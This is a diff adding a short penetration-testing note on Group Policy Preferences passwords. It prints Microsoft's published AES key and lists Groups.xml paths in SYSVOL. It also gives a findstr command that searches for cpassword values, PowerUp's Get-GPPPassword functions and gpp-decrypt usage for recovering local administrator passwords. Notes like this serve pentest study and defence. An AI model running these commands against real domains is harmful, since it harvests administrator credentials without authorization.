@@ -1,0 +1,35 @@
+<hr />
+<p><a href="https://pentestlab.blog/2017/03/20/group-policy-preferences/">WPE-07 - Group Policy Preferences</a></p>
+
+<p>Prior to patch MS14-025, there was a horrible storage of local administrator password, in a readable SMB share, SYSVOL, if the local administrator account was deployed via group policy.</p>
+
+<p>the keys are encripted but microsoft published the key</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
+f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
+</code></pre></div></div>
+
+<h2 id="1-find-groupsxml">1 find Groups.xml</h2>
+<p>ex:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
+\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
+</code></pre></div></div>
+<p>or:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml
+</code></pre></div></div>
+
+<h2 id="2-decrypt">2 decrypt</h2>
+
+<h4 id="-powerupps1">| PowerUp.ps1</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-CachedGPPPassword //For locally stored GP Files
+Get-GPPPassword //For GP Files stored in the DC
+</code></pre></div></div>
+<h4 id="-winpeas">| winpeas</h4>
+<p>winpeas checks for it</p>
+
+<h4 id="-gpp-decrypt">| gpp-decrypt</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat groups.XML
+...
+cpassword="edbiausdhiuhasd1289471890234nias098124n98"
+...
+gpp-decrypt  edbiausdhiuhasd1289471890234nias098124n98
+</code></pre></div></div>
